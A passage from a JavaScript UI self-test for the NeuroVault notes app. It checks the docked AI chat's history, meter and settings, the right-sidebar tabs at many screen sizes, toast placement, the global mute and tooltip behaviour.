        const turn = (q, a) => ({ q, scope: 'note', at: 0, answers: [{ text: a, by: 'Qwen3.5 4B', where: 'This PC', secs: 2 }] });
        set({ theme: 'obsidian', screen: '1920x1080' }); AIC.open = true; AIC.mode = 'dock'; S.tab = 'ask'; AIC.past = {}; AIC.viewing = null;
        // 1 · the newest answer's actions always show; earlier ones wait for hover or focus
        c.turns = [turn('one?', 'First.'), turn('two?', 'Second.')]; renderAll(); await tick();
        const acts = [...app.querySelectorAll('.aic-acts')]; acts.forEach(x => { x.style.transition = 'none'; }); const op = acts.map(x => getComputedStyle(x).opacity);
        P.acts = op.join('/'); if (op.length !== 2 || op[0] !== '0' || op[1] !== '1') pb('only the newest answer shows its actions at rest', P.acts);
        // 2 · follow-ups send the whole chat (no last-6 cap), or the last N; a carried summary goes first
        c.turns = Array.from({ length: 9 }, (_, i) => turn(`q${i}?`, `a${i}.`)); renderAll();
        let cl = await withApi({ ai_ask: () => ({ status: 'success', job: 'p1' }), ai_job: () => ({ status: 'success', state: 'done', result: { answer: 'ok', by: 'Qwen3.5 4B', turns: 9, dropped: 0 } }) }, async () => { await aicAsk(n, 'q9?'); });
        let h = cl.find(x => x[0] === 'ai_ask')?.[1][3] || []; P.whole = h.length; if (h.length !== 9 || h[0].q !== 'q0?') pb('follow-ups send the whole chat', `${h.length}: ${h.map(x => x.q).join(' ')}`);
        AIC.hist = 'last'; AIC.histN = 4; c.carry = 'You asked about q0.'; renderAll();
        cl = await withApi({ ai_ask: () => ({ status: 'success', job: 'p2' }), ai_job: () => ({ status: 'success', state: 'done', result: { answer: 'ok', by: 'Qwen3.5 4B' } }) }, async () => { await aicAsk(n, 'q10?'); });
        h = cl.find(x => x[0] === 'ai_ask')?.[1][3] || []; P.last = h.map(x => x.q).join(' | ');
        if (h.length !== 5 || h[0].a !== 'You asked about q0.' || h[4].q !== 'q9?') pb('"the last 4" sends 4, with the carried summary first', P.last);
        const m1 = app.querySelector('[data-aic-meter]'), cap1 = app.querySelector('.aic-capnote')?.textContent;
        if (!m1 || m1.textContent.trim() !== 'Last 4' || cap1 !== 'Follow-ups send the last 4 questions and answers') pb('the meter and the line say "Last 4"', `${m1?.textContent} · ${cap1}`);
        AIC.hist = 'whole'; AIC.histN = 6; c.carry = null;
        // 3 · the meter: role, value, amber at 80% with the "nearly full" line (New chat, New chat with a summary); full keeps going
        c.turns = [turn('small?', 'Small.')]; renderAll(); const m0 = app.querySelector('[data-aic-meter]');
        P.low = `${m0?.getAttribute('role')} ${m0?.getAttribute('aria-valuenow')}% ${m0?.classList.contains('is-high') ? 'amber' : 'calm'} · line ${!!app.querySelector('.aic-full')}`;
        if (!m0 || m0.getAttribute('role') !== 'meter' || +m0.getAttribute('aria-valuenow') >= 80 || m0.classList.contains('is-high') || app.querySelector('.aic-full')) pb('a short chat: a calm meter, no line', P.low);
        const big = 'x'.repeat(1500); c.turns = Array.from({ length: 16 }, (_, i) => turn(`long ${i}?`, big)); renderAll();
        const m8 = app.querySelector('[data-aic-meter]'), fl = app.querySelector('.aic-full'), pct8 = +m8?.getAttribute('aria-valuenow');
        P.high = `${pct8}% ${m8?.classList.contains('is-high') ? 'amber' : 'calm'} ${getComputedStyle(m8.querySelector('.aic-ring')).stroke} · "${fl?.querySelector('b')?.textContent}" · ${[...(fl?.querySelectorAll('button') || [])].map(b => b.textContent.trim()).join(' / ')}`;
        if (!(pct8 >= 80 && pct8 < 100) || !m8.classList.contains('is-high') || fl?.querySelector('b')?.textContent !== 'This chat is nearly full' || fl.querySelectorAll('[data-act="aic-new"]').length !== 2) pb('at 80%: amber, and the line offers New chat (and with a summary)', P.high);
        c.turns = Array.from({ length: 30 }, (_, i) => turn(`long ${i}?`, big)); renderAll();
        const ta = app.querySelector('#aic-in'), m9 = app.querySelector('[data-aic-meter]');
        P.full = `${m9?.getAttribute('aria-valuenow')}% · "${app.querySelector('.aic-full b')?.textContent}" · input ${ta?.disabled ? 'greyed' : 'open'} · "${app.querySelector('.aic-capnote')?.textContent}"`;
        if (m9?.getAttribute('aria-valuenow') !== '100' || app.querySelector('.aic-full b')?.textContent !== 'This chat is full' || ta.disabled || !/oldest no longer fit/.test(app.querySelector('.aic-capnote')?.textContent || '')) pb('a full chat keeps going (the input never greys)', P.full);
        ta.value = 'typing grows it'; ta.dispatchEvent(new Event('input', { bubbles: true })); ta.value = ''; ta.dispatchEvent(new Event('input', { bubbles: true }));
        if (document.activeElement !== ta && app.querySelector('#aic-in') !== ta) pb('the meter repaints in place while you type', '');
        // 4 · New chat: the chat goes to Earlier chats (read only); Undo puts it back; "with a summary" carries one over
        c.turns = [turn('What is due?', 'The roadmap, on **Friday**.'), turn('Who owns it?', 'Maya.')]; renderAll();
        S.toast = null; renderAll(); app.querySelector('.aic-head [data-act="aic-new"]').click(); await tick();
        P.newChat = `turns ${aicChat(key).turns.length} · earlier ${(AIC.past[key] || []).length} · carry ${!!aicChat(key).carry} · toast ${!!app.querySelector('.toast')} · undo ${!!app.querySelector('[data-act="hold-undo"]')}`;
        if (aicChat(key).turns.length || (AIC.past[key] || []).length !== 1 || aicChat(key).carry || app.querySelector('.toast') || app.querySelector('[data-act="hold-undo"]')) pb('New chat starts quietly: empty, the last one in Earlier chats, no toast (QC 72)', P.newChat);
        // 5 · Earlier chats: the clock lists them; one opens read only (a band, Copy only, no input); Back; Carry on from it
        app.querySelector('[data-act="aic-menu"][data-v="hist"]').click(); await tick();
        const hm = app.querySelector('[data-aic-menu]'), rows = [...(hm?.querySelectorAll('.menu-item') || [])].map(x => x.textContent.trim());
        P.menu = rows.join(' | '); if (rows.length !== 2 || !/^Current chat/.test(rows[0]) || !/^What is due\?/.test(rows[1])) pb('the clock lists the current chat and the earlier one', P.menu);
        hm.querySelectorAll('.menu-item')[1].click(); await tick();
        const ro = { band: app.querySelector('.aic-band')?.textContent, input: !!app.querySelector('#aic-in'), ins: app.querySelectorAll('.aic-win [data-v="ins"], .aic-win [data-v="again"]').length, copy: app.querySelectorAll('.aic-win [data-act="aic-copy"]').length, pressed: app.querySelector('[data-v="hist"]').getAttribute('aria-pressed'), bar: [...app.querySelectorAll('.aic-ro-bar button')].map(b => b.textContent) };
        P.ro = JSON.stringify(ro); if (!/read only/.test(ro.band || '') || ro.input || ro.ins || ro.copy !== 2 || ro.pressed !== 'true' || ro.bar.join() !== 'Carry on from it,Back to the current chat') pb('an earlier chat is read only (Copy only), with Carry on and Back', P.ro);
        inWin(app.querySelector('[data-aic-win]'), 'earlier chat', 'the chat');
        app.querySelector('.aic-ro-bar [data-act="aic-hist-cur"]').click(); await tick(); if (AIC.viewing || !app.querySelector('#aic-in')) pb('Back to the current chat', '');
        AIC.viewing = (AIC.past[key] || [])[0]?.id; renderAll(); app.querySelector('[data-act="aic-continue"]').click(); await tick();
        P.carry = `${aicChat(key).turns.length} turns · "${(aicChat(key).carry || '').slice(0, 60)}" · shown ${!!app.querySelector('.aic-carry')}`;
        if (AIC.viewing || aicChat(key).turns.length || !/^You asked 2 questions: “What is due\?”, “Who owns it\?”\. The last answer: Maya\./.test(aicChat(key).carry || '') || !app.querySelector('.aic-carry[open]')) pb('Carry on from it: a new chat that starts with its summary', P.carry);
        AIC.newHow = 'summary'; c.carry = null; c.turns = [turn('a?', 'b.')]; renderAll(); app.querySelector('.aic-head [data-act="aic-new"]').click(); await tick();
        if (!/^You asked 1 question/.test(aicChat(key).carry || '')) pb('New chat: "Brings a summary"', aicChat(key).carry);
        AIC.newHow = 'fresh';
        // 6 · Opening another note: its own chat (default), or "Keeps this chat"
        const other = D.notes.find(x => x.id !== key); c.carry = null; c.turns = [turn('kept?', 'Yes.')];
        aicFollow('keep'); openNote(other.id); await tick(); const keepQ = [...app.querySelectorAll('.aic-q')].map(x => x.textContent).join();
        aicFollow('note'); renderAll(); const ownQ = [...app.querySelectorAll('.aic-q')].map(x => x.textContent).join(); openNote(key); await tick();
        P.follow = `keep: "${keepQ}" · own: "${ownQ}"`; if (keepQ !== 'kept?' || ownQ !== '') pb('Opening another note: its own chat, or the one you are in', P.follow);
        // 7 · Settings → AI models: "AI in NeuroVault" in No AI, the last section (R60; it was first, R51); "Ask about this note" with its five rows and defaults
        AIC.open = false; S.setSec = 'ai'; AIS.tab = 'overview'; set({ modal: 'settings' }); const lastOv = [...app.querySelectorAll('.settings-pane .ais-sec')].at(-1)?.dataset.aisSec, cardsOv = [...app.querySelectorAll('.settings-pane .aic-group > .eyebrow')].map(x => x.textContent);
        AIS.tab = 'jobs'; renderAll();
        const cards = [...cardsOv, ...[...app.querySelectorAll('.settings-pane .aic-group > .eyebrow, .settings-pane .cf-card-title')].map(x => x.textContent)], rowsS = [...app.querySelectorAll('[data-aic-row]')].map(r => r.querySelector('.set-label').textContent + ': ' + r.querySelector('[aria-pressed="true"]')?.textContent);
        P.settings = `${cards.join(' · ')} || ${rowsS.join(' · ')}`;
        if (!cards.includes('AI in NeuroVault') || lastOv !== 'noai' || !cards.includes('Ask about this note') || rowsS.join(' · ') !== 'Esc while it answers: Stops the answer · Opening another note: Its own chat · Follow-ups send: The whole chat · New chat: Starts empty · Ask opens: Docked on the right') pb('Settings: the two cards and the chat’s defaults', P.settings);
        app.querySelector('[data-act="aic-set"][data-k="hist"][data-v="last"]').click(); await tick(); const sel = app.querySelector('[data-aic-histn]');
        if (AIC.hist !== 'last' || !sel || [...sel.options].map(o => o.value).join() !== '4,6,10,20' || sel.value !== '6') pb('"The last few" asks how many (4, 6, 10, 20)', sel?.outerHTML.slice(0, 80));
        sel.value = '10'; sel.dispatchEvent(new Event('change', { bubbles: true })); await tick(); if (AIC.histN !== 10) pb('How many is kept', AIC.histN);
        app.querySelector('[data-act="aic-set"][data-k="hist"][data-v="whole"]').click(); AIC.histN = 6; await tick();
        // 8 · AI in NeuroVault Off: every AI control hidden (header, chat, status bar, right-click Tidy up, the models); On brings them back
        AIS.tab = 'overview'; renderAll(); app.querySelector('[data-act="aic-ai"][data-v="off"]').click(); await tick();   // the switch is on Overview (four tabs)
        const offPane = [...app.querySelectorAll('.settings-pane .aic-group > .eyebrow, .settings-pane .cf-card-title')].map(x => x.textContent).join(), offRows = app.querySelectorAll('.settings-pane .route-row, .settings-pane .ai-hero').length;
        set({ modal: null }); AIC.open = true; renderAll(); await tick();
        const doc = app.querySelector('.doc'), para = doc?.querySelector('p'), rr = para?.getBoundingClientRect();
        para?.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: rr.left + 4, clientY: rr.top + 4 })); await tick(2);
        const off = { pane: offPane, models: offRows, header: app.querySelectorAll('[data-act="ain-ask"], [data-act="ain-sum"]').length, chat: !!app.querySelector('[data-aic-win]'), status: aiStatusLink() === '', menu: !!app.querySelector('.menu--word, .menu--context'), tidy: !!app.querySelector('[data-act="ctx-tidy"]') };
        S.ctx = null; renderAll(); P.off = JSON.stringify(off);
        if (off.pane !== 'AI in NeuroVault' || off.models || off.header || off.chat || !off.status || !off.menu || off.tidy) pb('Off hides every AI control', P.off);
        AIC.aiOn = true; renderAll(); para && app.querySelector('.doc p')?.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: rr.left + 4, clientY: rr.top + 4 })); await tick(2);
        const on = { header: app.querySelectorAll('[data-act="ain-ask"], [data-act="ain-sum"]').length, tidy: !!app.querySelector('[data-act="ctx-tidy"]') }; S.ctx = null; renderAll(); P.on = JSON.stringify(on);
        if (on.header !== 2 || !on.tidy) pb('On brings them back', P.on);
        c.turns = keepT; c.carry = null; AIC.past = {}; AIC.viewing = null; AIC.open = true; renderAll(); }
      // ---- R54: the right sidebar's tabs are icons, and the docked chat is its Ask tab. The mockup's size matrix as far as the app's
      //      screens go: the sidebar at 200 / 260 / 360 / 480 × 1366 / 1920 / 3440 × two fonts × the chat open or not (48 sizes) ----
      { const R = C.r54 = {}, rb = (k, v) => bad('R54 ' + k, v), rect = el => el.getBoundingClientRect(), n = note();
        const hit = (x, y, el) => { const t = document.elementFromPoint(x, y); return !!t && el.contains(t); };
        const keepChat = AIC.chats[n.id], keepMd = n.md; n.md = 'Intro.\n\n## One\n\nText.'; n.html = null; AIC.chats[n.id] = { turns: Array.from({ length: 6 }, (_, i) => ({ q: `question ${i}?`, scope: 'note', at: 0, answers: [{ text: 'An answer that runs to a few lines so the conversation scrolls. '.repeat(4), by: 'Qwen3.5 4B' }] })) };
        let sizes = 0;
        for (const sc of ['1366x768', '1920x1080', '3440x1440']) for (const f of ['opendyslexic', 'system']) for (const w of [200, 260, 360, 480]) for (const chat of [true, false]) {
          set({ screen: sc, font: f, side: true, view: 'notes', inspector: 'shown', modal: null }); parSet('insp', w, false);
          AIC.mode = 'dock'; AIC.open = chat; AIC.stick = true; S.tab = chat ? 'ask' : 'outline'; renderAll(); await tick(2); sizes++;
          const key = `${sc}/${f}/${w}/${chat ? 'chat' : 'tabs'}`, sb = app.querySelector('#right-sidebar'), tabs = [...sb.querySelectorAll('.tab')], track = sb.querySelector('.tab-track');
          sb.scrollIntoView({ block: 'nearest', inline: 'nearest' });
          const ws = tabs.map(t => t.getBoundingClientRect().width), want = chat ? 6 : 5;   // Build DV (QC 114): Documents is one more
          R[key] = `${Math.round(sb.offsetWidth)}px · tabs ${ws.map(Math.round).join('/')}`;
          if (tabs.length !== want || Math.min(...ws) < 28 - .5 || Math.max(...ws) - Math.min(...ws) > 1 || track.scrollWidth > track.clientWidth + 1) rb('the tabs share the strip evenly, none under 28px', `${key}: ${R[key]}`);
          if (tabs.some(t => t.querySelector('.tab-label') || !t.querySelector('svg') || !t.getAttribute('aria-label') || !/ · Alt\+[1-6]$/.test(t.dataset.tip || ''))) rb('icons only, named with their key in the tooltip', `${key}: ${tabs.map(t => t.dataset.tip).join(' | ')}`);
          if (!chat) continue;
          const win = sb.querySelector('.aic-win--tab'), head = win?.querySelector('.aic-head'), th = win?.querySelector('[data-aic-thread]'), comp = win?.querySelector('.aic-compose');
          if (!win || sb.querySelector('#insp-tab-ask')?.getAttribute('aria-selected') !== 'true') { rb('the chat is the selected Ask tab', key); continue; }
          const sr = rect(sb), wr = rect(win), hr = rect(head), tr = rect(th), cr = rect(comp), strip = rect(sb.querySelector('.tabs'));
          R[key] += ` · head ${Math.round(hr.top)}–${Math.round(hr.bottom)} · thread ${Math.round(tr.top)}–${Math.round(tr.bottom)} · input ${Math.round(cr.top)}`;
          if (wr.left < sr.left - .5 || wr.right > sr.right + .5 || wr.bottom > sr.bottom + .5) rb('the chat stays inside the sidebar', `${key}: ${R[key]}`);
          if (strip.bottom > hr.top + .5 || hr.bottom > tr.top + .5 || tr.bottom > cr.top + .5) rb('tabs, head, conversation and input never overlap', `${key}: ${R[key]}`);
          if (!hit(hr.left + hr.width / 2, hr.top + hr.height / 2, head) || !hit(tr.left + tr.width / 2, tr.top + 4, th)) rb('nothing paints over the head; the conversation starts right under it', `${key}: ${R[key]}`);
          window.scrollTo(0, 0); }
        R.sizes = sizes; parSet('insp', null, false);
        // keys: Alt+1–4 the tabs, Alt+5 Ask when docked; ← → in the strip; the tooltip shows on keyboard focus too
        set({ screen: '1920x1080', font: 'opendyslexic' }); AIC.open = true; AIC.mode = 'dock'; S.tab = 'outline'; renderAll(); await tick();
        const alt = d => { document.querySelector('.doc')?.dispatchEvent(new KeyboardEvent('keydown', { key: d, code: 'Digit' + d, altKey: true, bubbles: true, cancelable: true })); };
        const seen = []; for (const d of ['2', '3', '4', '5', '1']) { alt(d); await tick(); seen.push(S.tab); }
        app.querySelector('#insp-tab-outline').focus(); app.querySelector('#insp-tab-outline').dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowRight', bubbles: true })); await tick();
        const arrow = `${S.tab} focus ${document.activeElement?.id}`;
        const before5 = S.tab; AIC.open = false; renderAll(); alt('5'); await tick(); const noAsk = S.tab === before5 ? 'unchanged' : S.tab;
        tipShow(app.querySelector('#insp-tab-tags')); const tipRule = !TIP.el.hidden && TIP.el.textContent === 'Tags Alt+3' && getComputedStyle(TIP.el).backgroundColor === getComputedStyle(app.querySelector('.aic-win') || app.querySelector('.card') || app).backgroundColor; tipHide();
        const listed = KEYS.filter(k => /^Right sidebar: /.test(k.l)).map(k => keyText(k.k)).join(',');
        R.keys = `Alt+2..5,1 → ${seen.join(',')} · → from Outline: ${arrow} · Alt+5 with no chat: ${noAsk} · tooltip on focus, card ${tipRule} · Settings lists ${listed}`;
        if (seen.join() !== 'backlinks,tags,files,ask,outline' || arrow !== 'backlinks focus insp-tab-backlinks' || noAsk !== 'unchanged' || !tipRule || listed !== 'Alt+1,Alt+2,Alt+3,Alt+4,Alt+5,Alt+6') rb('Alt+1–5, the arrow keys and the tooltip', R.keys);   // Build DV (QC 114): Alt+6, Documents, listed too
        AIC.chats[n.id] = keepChat; n.md = keepMd; n.html = null; S.tab = 'ask'; AIC.open = true; renderAll(); }
      // ---- QC 72: after every chat action that tells you something, no toast covers the Ask input (docked and free, two screens) ----
      { const Q = C.qc72 = {}, qb = (k, v) => bad('QC 72 ' + k, v), n = note(), key = n.id, keepC = AIC.chats[key], keepPast = AIC.past[key];
        const over = () => { const box = app.querySelector('.aic-box')?.getBoundingClientRect(); return box ? [...app.querySelectorAll('.toast')].map(t => t.getBoundingClientRect()).filter(r => r.left < box.right && r.right > box.left && r.top < box.bottom && r.bottom > box.top).length : -1; };
        const turn1 = () => ({ turns: [{ q: 'What is due?', scope: 'note', at: 0, answers: [{ text: 'The roadmap, on Friday.', by: 'Qwen3.5 4B' }] }] });
        for (const sc of ['1366x768', '1920x1080']) for (const m of ['dock', 'float']) {
          set({ screen: sc, view: 'notes', inspector: 'shown', modal: null }); AIC.open = true; AIC.mode = m; AIC.rect = null; if (m === 'dock') S.tab = 'ask'; AIC.chats[key] = turn1(); renderAll(); await tick();
          const k2 = `${sc}/${m}`, seen = [];
          for (const [what, run] of [['copy', () => app.querySelector('[data-act="aic-copy"]').click()], ['insert at the top', () => aicInsert(0, 'top')], ['a toast', () => toast('Something to say')],
            ['new chat', () => { AIC.chats[key] = turn1(); renderAll(); aicNew(); }], ['dock or float', () => { app.querySelector('[data-act="aic-dock"]').click(); app.querySelector('[data-act="aic-dock"]').click(); }]]) {
            run(); await tick(3); const o = over(); seen.push(`${what} ${o}`); if (o > 0) qb('a toast covers the Ask input', `${k2}: ${what}`);
            if (HOLD.cur) holdUndo(); clearTimeout(toast.t); S.toast = null; renderAll(); await tick(); }   // no timer left to redraw later checks
          Q[k2] = seen.join(' · '); }
        AIC.chats[key] = keepC; AIC.past[key] = keepPast; AIC.mode = 'dock'; S.tab = 'ask'; set({ screen: '1920x1080' }); renderAll(); }
      // ---- QC 71: one global mute under ?mute=1 / ?check=1 (the user heard the chime from a sweep). Each kind of sound is started and
      //      what reaches the speakers is measured: the timer's chime and alarm, an ambient sound, a sound file, a Windows voice ----
      { const M = C.qc71 = {}, mb = (k, v) => bad('QC 71 ' + k, v), sleep = ms => new Promise(r => setTimeout(r, ms));
        const peak = async (ctx, ms = 350) => { if (!ctx?.nvMuteGain) return 'not muted'; const an = ctx.createAnalyser(); an.fftSize = 1024; ctx.nvMuteGain.connect(an); const buf = new Float32Array(1024); let p = 0;
          const t0 = performance.now(); while (performance.now() - t0 < ms) { an.getFloatTimeDomainData(buf); for (const v of buf) p = Math.max(p, Math.abs(v)); await sleep(25); } an.disconnect(); return p; };
        const keepT = { ...D.tset }; D.tset.custom_sound = null;
        D.tset.sound_name = 'chime'; playAlert(); M.chime = await peak(ALERT_CTX); D.tset.sound_name = 'alarm'; playAlert(); M.alarm = await peak(ALERT_CTX);
        Object.assign(D.tset, keepT);
        setSound('rain'); M.ambient = await peak(AUDIO.ctx); setSound('off');
        const wav = 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAIA+AAACABAAZGF0YQAAAAA=';
        const au = new Audio(wav); au.volume = 1; au.muted = false; await au.play().catch(() => {}); M.file = `muted ${au.muted} · volume ${au.volume}`; au.pause();
        let spoke = 'no voices'; if ('speechSynthesis' in window) { const u = new SpeechSynthesisUtterance('quiet'); u.volume = 1; speechSynthesis.speak(u); spoke = `volume ${u.volume}`; speechSynthesis.cancel(); } M.voice = spoke;
        M.audible = nvAudible(); M.on = NV_MUTE.on;
        if (!M.on || M.chime !== 0 || M.alarm !== 0 || M.ambient !== 0 || M.file !== 'muted true · volume 0' || !/^(no voices|volume 0)$/.test(M.voice) || M.audible.length) mb('nothing reaches the speakers under mute', JSON.stringify(M)); }
      // ---- QC 70: one shared tooltip, and no Windows tooltip. The shim (title, setAttribute, getAttribute, SVG <title>, the note
      //      left alone), the wait on hover, at once on focus, the key, the window's edge, the theme ----
      { const T = C.qc70 = {}, tb = (k, v) => bad('QC 70 ' + k, v), sleep = ms => new Promise(r => setTimeout(r, ms));
        const box = document.createElement('div'); box.innerHTML = '<button class="icon-btn" id="qt-a" title="Plain name"></button><button class="btn" id="qt-b" title="More about it">Words</button><svg id="qt-svg"><title>A drawing</title><path d="M0 0h4"/></svg>';
        document.body.appendChild(box); tipFlush();   // outside #app, so a draw can't take it away mid-test
        const qa = box.querySelector('#qt-a'), qb = box.querySelector('#qt-b'), qs = box.querySelector('#qt-svg');
        qa.title = 'Set by property'; const p1 = [qa.hasAttribute('title') && qa.outerHTML.includes(' title='), qa.dataset.tip, qa.title];
        qb.setAttribute('title', 'Set by setAttribute'); const p2 = [qb.outerHTML.includes(' title='), qb.dataset.tip, qb.getAttribute('title')];
        T.shim = { a: [qa.getAttribute('aria-label'), ...p1], b: [qb.getAttribute('aria-label'), qb.getAttribute('aria-description'), ...p2], svg: [qs.querySelector('title') ? 'kept' : 'gone', qs.getAttribute('aria-label'), qs.dataset.tip] };
        if (T.shim.a.join('|') !== 'Plain name|false|Set by property|Set by property' || T.shim.b.join('|') !== '|More about it|false|Set by setAttribute|Set by setAttribute' || T.shim.svg.join('|') !== 'gone|A drawing|A drawing') tb('the shim moves every title to the app’s tooltip', JSON.stringify(T.shim));
        const doc = app.querySelector('.doc'); if (doc) { const a2 = document.createElement('a'), a3 = document.createElement('a'); a2.href = a3.href = '#'; doc.append(a2); a2.setAttribute('title', 'the note’s own'); a3.setAttribute('title', 'made outside');
          doc.append(a3); tipFlush(); T.doc = `${tipAttr.call(a2, 'title')} · ${a3.getAttribute('title')}`; a2.remove(); a3.remove(); if (T.doc !== 'the note’s own · made outside') tb('the note’s own text is left alone, and its link titles kept', T.doc); }
        // hover: a short wait, then shown; moving to the next icon shows it at once; the key at its end as a key
        document.activeElement?.blur?.(); tipHide(); TIP.warm = 0; qa.dataset.tip = 'Timer · Ctrl+Alt+3';   // no tooltip left up by a script's focus
        // the clock is faked: the hover's own timer is held (never scheduled) and run by hand once "the wait is over", so headless
        // virtual time, or anything that clears the timer meanwhile, can't change the answer (the coordinator's sweep, 2026-10-19)
        const shows = [], show0 = tipShow, st0 = window.setTimeout, held = [];
        tipShow = function (el) { shows.push(el); return show0.apply(this, arguments); };   // eslint-disable-line no-global-assign
        window.setTimeout = function (fn, ms, ...rest) { if (typeof fn === 'function' && String(fn).includes('tipShow')) { held.push({ fn, ms }); return -1; } return st0.call(window, fn, ms, ...rest); };
        let at0, asked, shown, words, key, qbTimers, worded;
        try {
          qa.dispatchEvent(new PointerEvent('pointerover', { bubbles: true })); at0 = shows.includes(qa);
          const h = held.pop(); held.length = 0; asked = h?.ms ?? null;
          h?.fn(); shown = shows.includes(qa) && TIP.on === qa && !TIP.el.hidden;
          words = TIP.el.firstChild?.textContent?.trim(); key = TIP.el.querySelector('.nv-tip-key')?.textContent;
          qa.dispatchEvent(new PointerEvent('pointerout', { bubbles: true, relatedTarget: document.body }));
          qb.dispatchEvent(new PointerEvent('pointerover', { bubbles: true })); qbTimers = held.length; held.splice(0).forEach(x => x.fn()); worded = shows.includes(qb);   // QC 79: its name is in words
          qb.dispatchEvent(new PointerEvent('pointerout', { bubbles: true, relatedTarget: document.body }));
        } finally { tipShow = show0; window.setTimeout = st0; tipHide(); }   // eslint-disable-line no-global-assign
        T.hover = `at once ${at0} · the hover asked for ${asked} ms · after it: shown ${shown} "${words}" key "${key}" · a button with words: ${qbTimers} timers, ${worded ? 'shows one' : 'none'}`;
        if (at0 || asked !== TIP.wait || TIP.wait < 900 || !shown || words !== 'Timer' || key !== 'Ctrl+Alt+3' || qbTimers || worded) tb('about a second on hover, the key shown, none where the name is in words', T.hover);
        // the window's edge: an element at the right and bottom edges keeps its tooltip inside; a long one wraps
        tipHide(); Object.assign(box.style, { position: 'fixed', right: '0px', bottom: '0px', left: 'auto', top: 'auto', zIndex: 9999 }); qa.dataset.tip = 'A long tooltip that would run past the edge of the window if it weren’t kept inside'; tipShow(qa);
        const tr = TIP.el.getBoundingClientRect(), ar = qa.getBoundingClientRect(); T.edge = `${Math.round(tr.left)}–${Math.round(tr.right)} × ${Math.round(tr.top)}–${Math.round(tr.bottom)} in ${innerWidth}×${innerHeight} · ${tr.bottom <= ar.top + .5 ? 'above' : 'below'}`;
        if (tr.left < 7.5 || tr.right > innerWidth - 7.5 || tr.top < 7.5 || tr.bottom > innerHeight - 7.5 || tr.bottom > ar.top + .5) tb('it never runs past the window’s edge (over its element at the bottom)', T.edge);
        // the theme: the card surface and the theme's text, in a dark and a light theme
        const looks = []; for (const th of ['obsidian', 'paper']) { set({ theme: th }); document.body.appendChild(box); tipShow(qa); const c = getComputedStyle(TIP.el), ref = getComputedStyle(app.querySelector('.card') || app); looks.push(`${th} ${c.backgroundColor === ref.backgroundColor && c.color === getComputedStyle(app).color}`); tipHide(); }
        T.theme = looks.join(' · '); if (looks.some(x => /false$/.test(x))) tb('the theme’s card surface and text', T.theme);
        box.remove(); set({ theme: 'obsidian' }); renderAll(); }
      // ---- QC 79: a tooltip only where there's no visible name. On real screens (a note with the chat docked, Settings, Tasks, Timer):
      //      nothing with its name in words and no window button gets one; every icon-only control still has one ----
      { const Q = C.qc79 = {}, qb2 = (k, v) => bad('QC 79 ' + k, v), CTL = 'button, a[href], [role="button"], [role="tab"]';
        const screens = [['note and chat', () => { set({ view: 'notes', modal: null, inspector: 'shown' }); AIC.open = true; AIC.mode = 'dock'; S.tab = 'ask'; }],
          ['Settings', () => { AIC.open = false; S.setSec = 'editor'; set({ modal: 'settings' }); }], ['Tasks', () => set({ view: 'tasks', modal: null })], ['Timer', () => set({ view: 'timer', modal: null })]];
        for (const [name, go] of screens) { go(); renderAll(); await tick(2); tipFlush();
          const els = [...app.querySelectorAll(`${CTL}, [data-tip]`)].filter(el => el.offsetParent && el.getClientRects().length);
          const wrong = [], missing = []; let icon = 0, worded = 0;
          for (const el of els) {
            const named = tipNamed(el), gets = tipFor({ target: el }) === el;
            if ((el.closest('.win-btn') || named) && gets) wrong.push(`${el.tagName.toLowerCase()} "${(el.innerText || el.dataset.tip || '').trim().slice(0, 24)}"`);
            if (el.matches(CTL) && !named && el.querySelector('svg')) { icon++; if (!gets || !tipText(el)[0]) missing.push(`${el.tagName.toLowerCase()}.${(el.className || '').toString().split(' ')[0]}${el.dataset.act ? '[' + el.dataset.act + ']' : ''}`); }
            else if (named) worded++;
          }
          const winTip = [...app.querySelectorAll('.win-btn')].filter(el => tipFor({ target: el })).length;
          Q[name] = `${icon} icon-only with a tooltip · ${worded} with words, none · window buttons with one ${winTip}`;
          if (wrong.length || winTip) qb2('no tooltip where the name is in words, nor on the window buttons', `${name}: ${wrong.slice(0, 5).join(', ')}${winTip ? ` · ${winTip} window buttons` : ''}`);
          if (missing.length) qb2('every icon-only control has a tooltip', `${name}: ${missing.slice(0, 6).join(', ')}`); }
        set({ view: 'notes', modal: null }); AIC.open = true; S.tab = 'ask'; renderAll(); }
      // no AI: the conversation stays readable, only the input greys out
      aiDemo('none'); AI.st.providers = {}; renderAll(); const box = app.querySelector('.aic-box'), inp = app.querySelector('#aic-in');
      C.noai = `box off ${box?.classList.contains('is-off')} · disabled ${inp?.disabled} · "${inp?.placeholder}" · turns shown ${app.querySelectorAll('.aic-turn').length}`;
      if (!box?.classList.contains('is-off') || !inp?.disabled || inp.placeholder !== 'Enable AI to use this feature' || !app.querySelectorAll('.aic-turn').length) cb('no AI: readable, the input greyed with the reason', C.noai);
      aiDemo('ready');
      // Settings → AI models: what Esc does, and where Ask opens
      AIC.open = false; S.setSec = 'ai'; AIS.tab = 'jobs'; set({ modal: 'settings' });
      const escO = [...app.querySelectorAll('[data-act="aic-set"][data-k="esc"]')], modeO = [...app.querySelectorAll('[data-act="aic-set"][data-k="mode"]')];
      C.settings = `${escO.map(o => o.textContent + (o.getAttribute('aria-pressed') === 'true' ? ' (on)' : '')).join(' | ')} · ${modeO.map(o => o.textContent + (o.getAttribute('aria-pressed') === 'true' ? ' (on)' : '')).join(' | ')}`;
      if (C.settings !== 'Stops the answer (on) | Closes the window · Docked on the right (on) | A free window') cb('Settings: Esc (stops first, default) and where Ask opens (docked, default)', C.settings);
      escO[1].click(); await tick(); if (AIC.esc !== 'close') cb('Esc closes can be picked', AIC.esc); AIC.esc = 'stop';
      set({ modal: null }); S.setSec = 'appearance'; AIC.open = false; AIC.chats = {}; AIC.busy = null; AIC.menu = null; AIC.unread = false; renderAll(); }
    // 4c · QC 89: Page width (the user's first real user: "the borders on each side of the 'page' is too wide feels limiting").
    //      Each choice at 1366, 1920 and 3440: Narrow < Comfortable < Wide ≤ Full; Wide is wider than the old default and never edge
    //      to edge on an ultrawide screen; Full is the note area; the toolbar (Fit width, QC 66) is centred on the column. Then the
    //      same setting in Settings → Editor and the note's ⋮ More
    { const P = N.qc89 = { cols: {} }, pb = (k, v) => bad('QC 89 ' + k, v), was = S.a11y.width, wasTb = { ...PAR.tb };
